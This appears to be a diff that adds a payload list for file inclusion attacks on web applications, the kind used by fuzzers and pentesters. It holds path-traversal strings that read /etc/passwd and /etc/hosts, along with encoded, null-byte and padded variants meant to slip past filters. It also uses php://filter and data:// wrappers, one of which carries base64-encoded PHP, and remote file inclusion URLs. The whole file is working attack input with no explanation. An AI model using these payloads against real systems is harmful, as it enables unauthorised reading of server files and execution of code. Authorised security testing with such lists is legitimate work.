@@ -1,0 +1,33 @@
+file:///etc/passwd
+https://example.com/viewimage/?url=file:///etc/passwd
+
+Local File Inclusion - Basic##									../../../file
+Local File Inclusion - URL Encoded -1##							..%2f..%2f..%2ffile
+Local File Inclusion - URL Encoded -2##							%2e%2e/%2e%2e/file
+Local File Inclusion - Full URL Encoded##						%2e%2e%2f%2e%2e%2ffile
+Local File Inclusion - Null Byte##								../../../file%00
+Local File Inclusion - Extra dot for Unix##						.........................../../../../file
+Local File Inclusion - Extra dot for Windows##					...........................\..\..\..\file
+Local File Inclusion - bypass for custom filter##				../../../../../filename/////[...]/////
+Local File Inclusion - Extra Slash##							../../../../../file//////////////
+Local File Inclusion - Single dot with null##					/../etc/./passwd%00
+Local File Inclusion - Single dot##								/../etc/./passwd
+Local File Inclusion - Showcode##								/showcode.php/C:Windows/aaa.txt
+
+Local File Inclusion - with file wrapper##						file:///etc/hosts
+Local File Inclusion - with data wrapper##						data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=
+
+Local File Inclusion - normalization##							../etc/./hosts
+Local File Inclusion - normalization##							../../etc/././././hosts
+
+Local File Inclusion - with php wrapper##						php://filter/read=convert.base64-encode/resource=index.php
+Local File Inclusion - custom path inserted##					../../../../etc/aaa/../hosts
+Local File Inclusion - custom path inserted-2##					../../../../etc/aaa/../aaa/bbb/../../hosts
+
+Local File Inclusion - path normalization##						..////////////..////////////////..///////////////../etc//////////hosts
+Local File Inclusion - path normalization for older phps-1##		../../../../etc/hosts/.
+Local File Inclusion - path normalization for older phps-2##		/etc/passwd/./././././.
+Local File Inclusion - path normalization for older phps-3##		/etc/hosts///////////
+
+Remote File Inclusion - Basic##									http://localhost/aa.txt
+Remote File Inclusion - without protocol##						www.site.com/aa.txt
